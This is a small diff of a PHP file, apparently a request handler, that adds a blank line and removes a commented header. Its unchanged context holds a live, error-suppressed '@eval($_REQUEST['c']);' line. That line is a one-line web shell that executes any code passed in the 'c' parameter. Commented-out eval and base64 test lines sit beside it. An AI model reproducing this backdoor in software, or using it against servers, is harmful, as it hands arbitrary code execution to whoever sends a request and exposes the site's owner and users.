@@ -21,6 +21,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
 //eval($a);
 //eval($_REQUEST['c']);
 //eval('echo base64_decode("ZWNobyAnMTExJzs=");');
+
 @eval($_REQUEST['c']);
 //print_r($_REQUEST);
 //print_r($_REQUEST['test']);
@@ -38,7 +39,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
 //    return base64_encode($val);
 //};
 //echo $encode('asdfasdf');
-
-//header("Content-Type: text/html;charset=UTF-8");
+ 
 
 ?>
